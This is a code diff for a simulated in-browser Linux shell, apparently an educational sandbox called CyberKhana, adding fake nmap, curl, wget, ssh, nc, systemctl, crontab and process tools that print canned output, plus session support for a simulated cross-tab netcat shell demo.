+    return 0;
+  },
+  nmap(args, { w }) {
+    const sv = args.includes('-sV') || args.includes('-A');
+    const host = nonFlagFiles(args, ['-p', '-oN', '-oX', '-oG', '--script', '-T']).pop() ?? '10.0.0.5';
+    const ip = resolveHost(host);
+    const ports = [
+      { p: 22, s: 'ssh', v: 'OpenSSH 8.9p1 Ubuntu 3ubuntu0.4' },
+      { p: 80, s: 'http', v: 'nginx 1.24.0' },
+      { p: 443, s: 'https', v: 'nginx 1.24.0' },
+      { p: 3306, s: 'mysql', v: 'MySQL 8.0.36-0ubuntu0.22.04.1' },
+    ];
+    w(`Starting Nmap 7.94 ( https://nmap.org )\nNmap scan report for ${host}${/^\d/.test(host) ? '' : ` (${ip})`}\nHost is up (0.00042s latency).\nNot shown: 996 closed tcp ports (reset)\n`);
+    w(`PORT     STATE SERVICE${sv ? '  VERSION' : ''}\n`);
+    for (const pt of ports) w(`${(pt.p + '/tcp').padEnd(9)}open  ${sv ? pt.s.padEnd(8) + pt.v : pt.s}\n`);
+    if (sv) w('Service detection performed. Please report any incorrect results.\n');
+    w('\nNmap done: 1 IP address (1 host up) scanned in 1.34 seconds\n');
+    return 0;
+  },
+  ss(args, io) { return sockStat(args, io); },
+  netstat(args, io) { return sockStat(args, io); },
+  traceroute(args, { w, ctx }) {
+    const host = args.filter((a) => !a.startsWith('-'))[0] ?? 'example.com';
+    const ip = resolveHost(host);
+    w(`traceroute to ${host} (${ip}), 30 hops max, 60 byte packets\n 1  10.0.0.1 (10.0.0.1)  0.512 ms  0.480 ms  0.470 ms\n 2  100.64.0.1 (100.64.0.1)  4.20 ms  4.11 ms  4.05 ms\n 3  ${ip} (${ip})  12.4 ms  12.1 ms  12.0 ms\n`);
+    return 0;
+  },
+  curl(args, { w, ctx }) {
+    const headOnly = args.includes('-I') || args.includes('--head');
+    const silent = args.includes('-s') || args.includes('--silent');
+    const outFile = args.includes('-o') ? args[args.indexOf('-o') + 1] : null;
+    const saveRemote = args.includes('-O');
+    const url = nonFlagFiles(args, ['-o', '-X', '-H', '-d', '--data', '-A', '-u']).pop();
+    if (!url) { w("curl: try 'curl --help' for more information\n"); return 2; }
+    const m = /^(?:https?:\/\/)?([^/]+)(\/.*)?$/.exec(url);
+    const hostname = m?.[1] ?? url;
+    const body = `<!doctype html>\n<html>\n<head><title>${hostname}</title></head>\n<body>\n<h1>Welcome to ${hostname}</h1>\n<p>It works! Served from the CyberKhana lab.</p>\n</body>\n</html>\n`;
+    const headers = `HTTP/1.1 200 OK\nServer: nginx/1.24.0\nDate: ${new Date().toUTCString()}\nContent-Type: text/html; charset=UTF-8\nContent-Length: ${body.length}\nConnection: keep-alive\n`;
+    if (outFile || saveRemote) {
+      const fname = outFile ?? (url.replace(/\/+$/, '').split('/').pop() || 'index.html');
+      if (ctx.fs) writeFile(ctx, resolvePath(ctx, fname), body);
+      if (!silent) w(`  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n100  ${String(body.length).padStart(4)}  100  ${String(body.length).padStart(4)}    0     0  15000      0 --:--:-- --:--:-- --:--:-- 15000\n`);
+      return 0;
+    }
+    if (headOnly) { w(headers); return 0; }
+    w(body);
+    return 0;
+  },
+  wget(args, { w, ctx }) {
+    const outFile = args.includes('-O') ? args[args.indexOf('-O') + 1] : null;
+    const url = nonFlagFiles(args, ['-O', '-o', '-P']).pop();
+    if (!url) { w('wget: missing URL\nUsage: wget [OPTION]... [URL]...\n'); return 1; }
+    const m = /^(?:https?:\/\/)?([^/]+)(\/.*)?$/.exec(url);
+    const hostname = m?.[1] ?? url;
+    const ip = resolveHost(hostname);
+    const fname = outFile ?? (url.replace(/\/+$/, '').split('/').pop() || 'index.html');
+    const body = `<!doctype html><html><body><h1>${hostname}</h1><p>Fetched by the CyberKhana lab.</p></body></html>\n`;
+    if (ctx.fs) writeFile(ctx, resolvePath(ctx, fname), body);
+    const now = new Date().toISOString().replace('T', ' ').slice(0, 19);
+    w(`--${now}--  ${url}\nResolving ${hostname} (${hostname})... ${ip}\nConnecting to ${hostname} (${hostname})|${ip}|:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: ${body.length} [text/html]\nSaving to: '${fname}'\n\n${fname}  100%[===================>]  ${body.length}  --.-KB/s    in 0s\n\n${now} (12.3 MB/s) - '${fname}' saved [${body.length}/${body.length}]\n`);
+    return 0;
+  },
+  ssh(args, { w, ctx }) {
+    const pos = args.filter((a) => !a.startsWith('-'));
+    const dest = pos[0];
+    if (!dest) { w('usage: ssh [user@]hostname [command]\n'); return 255; }
+    const [uPart, hPart] = dest.includes('@') ? dest.split('@') : [ctx.user ?? 'user', dest];
+    const ip = resolveHost(hPart);
+    const remoteCmd = pos.slice(1).join(' ');
+    const known = ['10.0.0.5', 'target.lab', 'localhost', '127.0.0.1', 'cyberkhana'].includes(hPart.toLowerCase());
+    if (!known) { w(`ssh: connect to host ${hPart} port 22: Connection refused\n`); return 255; }
+    w(`The authenticity of host '${hPart} (${ip})' can't be established.\nED25519 key fingerprint is SHA256:Zm9vYmFyLWxhYi1rZXktZmluZ2VycHJpbnQ.\nWarning: Permanently added '${hPart}' (ED25519) to the list of known hosts.\n`);
+    w(`${uPart}@${hPart}'s password:\nWelcome to CyberKhana Lab Target (GNU/Linux 6.1.0-cyberkhana x86_64)\nLast login: ${new Date().toDateString()} from ${localIpOf(ctx)}\n`);
+    if (remoteCmd) w(`${uPart}@${hPart}:~$ ${remoteCmd}\n(simulated) '${remoteCmd}' ran on ${hPart}.\n`);
+    w(`\n[i] This is a simulated SSH login. For a fully interactive remote shell, use the nc reverse-shell demo across two terminal tabs.\nConnection to ${hPart} closed.\n`);
+    return 0;
+  },
+  scp(args, { w, ctx }) {
+    const pos = args.filter((a) => !a.startsWith('-'));
+    if (pos.length < 2) { w('usage: scp [-r] source ... target\n'); return 1; }
+    const src = pos[0]; const dst = pos[pos.length - 1];
+    if (dst.includes(':')) {
+      const n = ctx.fs ? nodeAt(ctx.fs, resolvePath(ctx, src)) : undefined;
+      if (!isFile(n)) { w(`scp: ${src}: No such file or directory\n`); return 1; }
+      w(`${(src.split('/').pop() || src).padEnd(28)} 100% ${String(n.file.length).padStart(5)}     1.2MB/s   00:00\n`);
+      return 0;
+    }
+    const fname = src.split(':').pop()?.split('/').pop() || 'download';
+    const target = dst === '.' ? fname : dst;
+    if (ctx.fs) writeFile(ctx, resolvePath(ctx, target), `# fetched via scp from ${src} (simulated)\n`);
+    w(`${fname.padEnd(28)} 100%  512     1.0MB/s   00:00\n`);
+    return 0;
+  },
+  nc(args, io) { return ncRun(args, io); },
+  netcat(args, io) { return ncRun(args, io); },
+
+  /* ── Services & logs ── */
+  systemctl(args, { w }) {
+    const sub = args.find((a) => !a.startsWith('-')) ?? 'status';
+    const svc = args.slice(args.indexOf(sub) + 1).find((a) => !a.startsWith('-'));
+    if (sub === 'list-units' || sub === 'list-unit-files') {
+      w('UNIT                     LOAD   ACTIVE SUB     DESCRIPTION\nssh.service              loaded active running OpenSSH server daemon\nnginx.service            loaded active running nginx web server\ncron.service             loaded active running Regular background program processing\nsystemd-journald.service loaded active running Journal Service\n');
+      return 0;
+    }
+    if (['start', 'stop', 'restart', 'reload'].includes(sub)) return 0; // silent success, like the real tool
+    if (sub === 'enable') { w(`Created symlink /etc/systemd/system/multi-user.target.wants/${svc ?? 'ssh'}.service → /lib/systemd/system/${svc ?? 'ssh'}.service.\n`); return 0; }
+    if (sub === 'disable') { w(`Removed "/etc/systemd/system/multi-user.target.wants/${svc ?? 'ssh'}.service".\n`); return 0; }
+    if (sub === 'is-active') { w('active\n'); return 0; }
+    if (sub === 'is-enabled') { w('enabled\n'); return 0; }
+    if (sub === 'status') {
+      const s = svc ?? 'ssh';
+      w(`● ${s}.service - ${s} service\n     Loaded: loaded (/lib/systemd/system/${s}.service; enabled; preset: enabled)\n     Active: active (running) since ${new Date().toDateString()}; 2h ago\n   Main PID: 1000 (${s})\n      Tasks: 2 (limit: 1131)\n     Memory: 5.2M\n        CPU: 120ms\n     CGroup: /system.slice/${s}.service\n             └─1000 /usr/sbin/${s}\n`);
+      return 0;
+    }
+    w(`Unknown operation ${sub}.\n`); return 1;
+  },
+  service(args, { w }) {
+    const svc = args[0] ?? 'ssh';
+    const action = args[1] ?? 'status';
+    if (action === 'status') { w(`● ${svc}.service is running\n`); return 0; }
+    w(` * ${action.charAt(0).toUpperCase() + action.slice(1)}ing ${svc} ...\n   ...done.\n`);
+    return 0;
+  },
+  journalctl(args, { w, ctx }) {
+    let n = 0; let unit: string | null = null;
+    for (let i = 0; i < args.length; i++) {
+      const a = args[i];
+      if (a === '-n' || a === '--lines') n = parseInt(args[++i], 10) || 10;
+      else if (/^-n\d+$/.test(a)) n = parseInt(a.slice(2), 10);
+      else if (a === '-u' || a === '--unit') unit = args[++i];
+    }
+    const syslog = ctx.fs ? nodeAt(ctx.fs, '/var/log/syslog') : undefined;
+    let lines = isFile(syslog) ? splitLines(syslog.file) : [];
+    if (unit) { const key = unit.replace('.service', '').toLowerCase(); lines = lines.filter((l) => l.toLowerCase().includes(key)); }
+    if (n > 0) lines = lines.slice(-n);
+    if (args.includes('-f')) w('-- Live follow (-f) is disabled in the sandbox; showing recent entries --\n');
+    w(lines.length ? lines.join('\n') + '\n' : '-- No entries --\n');
+    return 0;
+  },
+  dmesg(_args, { w }) {
+    w('[    0.000000] Linux version 6.1.0-cyberkhana (gcc 12.2.0)\n[    0.000000] Command line: BOOT_IMAGE=/boot/vmlinuz root=/dev/vda1 ro quiet\n[    0.084000] Memory: 2048000K/2097152K available\n[    1.204815] eth0: renamed from veth0; link up, 1000 Mbps, full duplex\n[    2.551013] EXT4-fs (vda1): mounted filesystem with ordered data mode\n[   12.441002] EXT4-fs error (device vda1): failed to read block 42\n[   45.882101] audit: type=1400 apparmor="STATUS" operation="profile_load" name="nginx"\n');
+    return 0;
+  },
+
+  /* ── Processes & monitoring ── */
+  kill(args, { w }) {
+    if (args.includes('-l')) { w('HUP INT QUIT ILL TRAP ABRT BUS FPE KILL USR1 SEGV USR2 PIPE ALRM TERM STKFLT CHLD CONT STOP\n'); return 0; }
+    const pids = args.filter((a) => /^\d+$/.test(a));
+    if (!pids.length) { w('usage: kill [-s signal | -signal] pid ...\n'); return 1; }
+    const alive = new Set(['1', '1000', '1337', '1420', '1502', '2001', '2100']);
+    let status = 0;
+    for (const p of pids) if (!alive.has(p)) { w(`bash: kill: (${p}) - No such process\n`); status = 1; }
+    return status;
+  },
+  killall(args, { w }) {
+    const name = args.filter((a) => !a.startsWith('-'))[0];
+    if (!name) { w('Usage: killall [-signal] name ...\n'); return 1; }
+    if (['bash', 'sleep', 'nginx', 'sshd', 'nc', 'cron'].includes(name)) return 0;
+    w(`${name}: no process found\n`); return 1;
+  },
+  pkill() { return 0; },
+  jobs() { return 0; },
+  fg(_args, { w }) { w('bash: fg: current: no such job\n'); return 1; },
+  bg(_args, { w }) { w('bash: bg: current: no such job\n'); return 1; },
+  disown() { return 0; },
+  top(_args, { w, ctx }) {
+    const u = ctx.user ?? 'user';
+    w(`top - ${new Date().toTimeString().slice(0, 8)} up 2 days,  3:14,  1 user,  load average: 0.08, 0.03, 0.01\nTasks:  42 total,   1 running,  41 sleeping,   0 stopped,   0 zombie\n%Cpu(s):  1.3 us,  0.7 sy,  0.0 ni, 97.7 id,  0.3 wa,  0.0 hi,  0.0 si,  0.0 st\nMiB Mem :   2000.0 total,   1000.0 free,    512.0 used,    488.0 buff/cache\nMiB Swap:   1024.0 total,   1024.0 free,      0.0 used.   1400.0 avail Mem\n\n    PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND\n   1000 root      20   0   15232   9216   7168 S   0.3   0.5   0:02.13 sshd\n   1502 ${u.padEnd(9)}20   0  132000  22000  12000 S   0.7   1.1   0:05.44 nginx\n   1337 ${u.padEnd(9)}20   0   12000   5000   3200 S   0.0   0.2   0:00.42 bash\n\n[i] Interactive top isn't available in the sandbox — this is a one-time snapshot.\n`);
+    return 0;
+  },
+  htop(args, io) { return BUILTINS.top(args, io); },
+  watch(args, io) {
+    let i = 0;
+    if (args[i] === '-n') i += 2;
+    else if (/^-n\d/.test(args[i] ?? '')) i += 1;
+    while (args[i] && args[i].startsWith('-')) i++;
+    const cmd = args[i];
+    const rest = args.slice(i + 1);
+    if (!cmd) { io.w('Usage: watch [-n secs] command\n'); return 1; }
+    io.w(`Every 2.0s: ${[cmd, ...rest].join(' ')}\t\t${new Date().toTimeString().slice(0, 8)}\n\n`);
+    const b = BUILTINS[cmd];
+    if (b) return b(rest, io) | 0;
+    if (cmd.includes('/')) return execFile(cmd, rest, io);
+    io.w(`${cmd}: command not found\n`); return 127;
+  },
+  crontab(args, { w, ctx }) {
+    ctx.crontab ??= [];
+    if (args[0] === '-l') { w(ctx.crontab.length ? ctx.crontab.join('\n') + '\n' : `no crontab for ${ctx.user ?? 'user'}\n`); return ctx.crontab.length ? 0 : 1; }
+    if (args[0] === '-r') { ctx.crontab = []; return 0; }
+    if (args[0] === '-e') { w(`crontab: a full-screen editor isn't available in the sandbox.\nTip: build a crontab from a file, e.g.\n  echo "0 2 * * * /home/${ctx.user ?? 'user'}/scripts/backup.sh" > mycron\n  crontab mycron\n  crontab -l\n`); return 0; }
+    const file = args.find((a) => !a.startsWith('-'));
+    if (file && ctx.fs) { const n = nodeAt(ctx.fs, resolvePath(ctx, file)); if (isFile(n)) { ctx.crontab = splitLines(n.file).filter(Boolean); return 0; } w(`crontab: ${file}: No such file or directory\n`); return 1; }
+    w('usage: crontab [-l | -e | -r | file]\n'); return 1;
+  },
+
+  /* ── Editors & power (informative stubs) ── */
+  nano(args, { w }) { w(editorNote('nano', args)); return 0; },
+  vi(args, { w }) { w(editorNote('vi', args)); return 0; },
+  vim(args, { w }) { w(editorNote('vim', args)); return 0; },
+  nvim(args, { w }) { w(editorNote('nvim', args)); return 0; },
+  emacs(args, { w }) { w(editorNote('emacs', args)); return 0; },
+  reboot(_args, { w }) { w('[i] Reboot is disabled in the sandbox — nothing to restart here.\n'); return 0; },
+  shutdown(_args, { w }) { w('[i] Shutdown is disabled in the sandbox — this shell keeps running.\n'); return 0; },
+  poweroff(_args, { w }) { w('[i] Power-off is disabled in the sandbox.\n'); return 0; },
+  zsh(_args, { w }) { w('[i] This sandbox runs bash. zsh shares the same basics covered in the course.\n'); return 0; },
+
   test: testBuiltin,
   '[': (args, io) => { if (args[args.length - 1] !== ']') return 2; return testBuiltin(args.slice(0, -1), io); },
 };
@@ -1126,12 +1788,25 @@ export interface ShellRunResult {
   exited?: boolean;
   cwd: string;
   cwdLabel: string;
+  /** Current identity after the command (changes with `su` / `sudo -i`). */
+  user: string;
+  /** Set when `nc` asks the UI to open a live cross-tab socket. */
+  net?: NetRequest | null;
 }
 
 export interface ShellSession {
   readonly user: string;
   /** Run one command line against the persistent session. */
   run(line: string, timeoutMs?: number): ShellRunResult;
+  /** The user identity the shell is currently running as (after any `su`). */
+  currentUser(): string;
+  /** Tell the shell which IP it holds on the simulated LAN (for ip/nc/etc.). */
+  setLocalIp(ip: string): void;
+  /**
+   * Run one line but capture output via a writer, for feeding a remote peer a
+   * live shell (the nc reverse/bind-shell demo). Returns the new cwd label.
+   */
+  runInto(line: string, write: (s: string) => void): void;
   /**
    * Tab-completion for the given input. `replacement` is the new input line if
    * the completion resolved (or advanced to a common prefix), else null;
@@ -1153,9 +1828,10 @@ function seedSession(user: string): { fs: FSDir; env: Record<string, string>; cw
   const F = (path: string, content: string, mode?: string) => { writeFile(c, path, content); if (mode) { const n = nodeAt(fs, path); if (n) n.mode = mode; } };
 
   // A realistic little Linux tree.
-  for (const d of ['/bin', '/etc', '/tmp', '/root', '/opt', '/usr/bin', '/usr/share', '/var/log', '/var/www/html',
+  for (const d of ['/bin', '/etc', '/etc/apt', '/etc/ssh', '/tmp', '/root', '/opt', '/usr/bin', '/usr/share',
+    '/var/log', '/var/www/html', '/var/spool/cron/crontabs',
     home, `${home}/Documents`, `${home}/Downloads`, `${home}/Desktop`, `${home}/Pictures`,
-    `${home}/projects/webapp`, `${home}/scripts`, `${home}/notes`, `${home}/.config`]) ensureDir(fs, d);
+    `${home}/projects/webapp`, `${home}/scripts`, `${home}/notes`, `${home}/.config`, `${home}/.ssh`]) ensureDir(fs, d);
 
   // System files
   F('/etc/hostname', 'cyberkhana\n');
@@ -1165,6 +1841,10 @@ function seedSession(user: string): { fs: FSDir; env: Record<string, string>; cw
     `root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n${user}:x:1000:1000:${user}:/home/${user}:/bin/bash\n`);
   F('/etc/shadow', 'root:!:19000:0:99999:7:::\n', 'r--------');
   F('/etc/motd', 'Welcome to CyberKhana Linux — a safe practice sandbox.\n');
+  F('/etc/resolv.conf', 'nameserver 10.0.0.1\nnameserver 1.1.1.1\nsearch cyberkhana.local\n');
+  F('/etc/apt/sources.list', 'deb http://deb.cyberkhana.local stable main contrib\ndeb http://security.cyberkhana.local stable-security main\n');
+  F('/etc/crontab', '# m h dom mon dow user  command\n17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly\n0  2    * * *   root    /usr/local/sbin/backup.sh\n');
+  F('/etc/group', 'root:x:0:\nsudo:x:27:' + user + '\nwww-data:x:33:\n' + user + ':x:1000:\n');
   F('/var/log/syslog',
     'Jul  3 10:00:01 cyberkhana systemd[1]: Started Daily apt download activities.\n' +
     'Jul  3 10:05:14 cyberkhana kernel: [  0.000000] Linux version 6.1.0-cyberkhana\n' +
@@ -1229,6 +1909,9 @@ export function createShellSession(opts: { user?: string; restore?: string | nul
     home: seed.home,
     user,
     history: [],
+    packages: new Set(),
+    crontab: [],
+    userStack: [],
   };
 
   if (opts.restore) {
@@ -1238,6 +1921,8 @@ export function createShellSession(opts: { user?: string; restore?: string | nul
       if (s.env) ctx.env = s.env;
       if (typeof s.cwd === 'string') ctx.cwd = s.cwd;
       if (Array.isArray(s.history)) ctx.history = s.history;
+      if (Array.isArray(s.packages)) ctx.packages = new Set(s.packages);
+      if (Array.isArray(s.crontab)) ctx.crontab = s.crontab;
     } catch {
       /* corrupt snapshot — keep the fresh seed */
     }
@@ -1248,6 +1933,7 @@ export function createShellSession(opts: { user?: string; restore?: string | nul
     ctx.stdinBuf = '';
     ctx.stdinPos = 0;
     ctx.cleared = false;
+    ctx.net = null;
     if (line.trim() !== '') ctx.history!.push(line);
     const deadline = Date.now() + timeoutMs;
     ctx.checkTime = () => { if (Date.now() > deadline) throw new ShellError('command timed out'); };
@@ -1261,7 +1947,15 @@ export function createShellSession(opts: { user?: string; restore?: string | nul
       else error = `bash: ${e instanceof Error ? e.message : String(e)}`;
     }
     ctx.env.PWD = ctx.cwd!;
-    return { output: ctx.out, error, cleared: ctx.cleared, exited, cwd: ctx.cwd!, cwdLabel: prettyCwd(ctx) };
+    return { output: ctx.out, error, cleared: ctx.cleared, exited, cwd: ctx.cwd!, cwdLabel: prettyCwd(ctx), user: ctx.user!, net: ctx.net };
+  };
+
+  /** Run a line for a remote peer (nc shell), routing all output to `write`. */
+  const runInto = (line: string, write: (s: string) => void) => {
+    const r = run(line);
+    if (r.cleared) return;
+    if (r.output) write(r.output);
+    if (r.error) write(r.error + '\n');
   };
 
   const reset = () => {
@@ -1272,6 +1966,10 @@ export function createShellSession(opts: { user?: string; restore?: string | nul
     ctx.home = fresh.home;
     ctx.history = [];
     ctx.status = 0;
+    ctx.user = user;
+    ctx.packages = new Set();
+    ctx.crontab = [];
+    ctx.userStack = [];
   };
 
   const commandNames = Object.keys(BUILTINS).sort();
@@ -1315,9 +2013,15 @@ export function createShellSession(opts: { user?: string; restore?: string | nul
   return {
     user,
     run,
+    runInto,
     complete,
+    currentUser: () => ctx.user ?? user,
+    setLocalIp: (ip: string) => { ctx.localIp = ip; },
     cwdLabel: () => prettyCwd(ctx),
-    snapshot: () => JSON.stringify({ fs: ctx.fs, env: ctx.env, cwd: ctx.cwd, history: ctx.history }),
+    snapshot: () => JSON.stringify({
+      fs: ctx.fs, env: ctx.env, cwd: ctx.cwd, history: ctx.history,
+      packages: [...(ctx.packages ?? [])], crontab: ctx.crontab,
+    }),
     reset,
   };
 }
